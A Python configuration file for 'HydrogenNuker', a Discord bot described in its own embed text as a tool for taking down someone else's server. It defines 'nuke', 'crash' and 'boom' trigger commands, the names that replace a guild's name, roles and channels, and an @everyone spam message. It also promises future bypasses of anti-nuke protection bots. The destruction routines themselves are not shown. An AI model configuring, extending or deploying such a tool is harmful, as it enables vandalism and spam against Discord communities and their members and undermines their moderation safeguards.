import disnake
from disnake.ext import commands

class Nuker:
    auto_activation = (True, [1337133713371337])
    manual_activation = (True, [1337133713371337], ["nuke", "crash", "boom"])
    
    class Naming:
        reason = "github.com/emopunkq/Hydrogen"
        role_name = "github.com/emopunkq/Hydrogen"
        guild_name = "github.com/emopunkq/Hydrogen"
        channel_name = "hydrogen"
        channel_topic = "https://github.com/emopunkq/Hydrogen"
    
    class Message:
        content = "@everyone https://github.com/emopunkq/Hydrogen @everyone"
        embed = disnake.Embed()
        embed.color = 0x2f3136
        embed.set_author(
            name="Nuked Via HydrogenNuker",
            url="https://github.com/emopunkq/Hydrogen"
        )
        embed.description = "Thank you for using my far from perfect code. You can of course use the default settings, but it's better to customize it, put your own link, etc. The bot does not have a rich functionality yet, but if your task is to take down someone's server, the bot will easily cope. Various anti-crash bot bypasses will be added in the future (if I don't get lazy). I will be glad to any help with the code, discord : emopunkq"
        embed.set_image(
            url="https://i.imgur.com/Ni9mXaB.jpeg"
        )

class Client:
    intents = disnake.Intents.default()
    intents.members = True
    intents.message_content = True
    command_sync_flags = commands.CommandSyncFlags.default()
    command_sync_flags.sync_global_commands = True
    
    class Auth:
        debug = "..."
        release = "..." # ENTER YOUR TOKEN HERE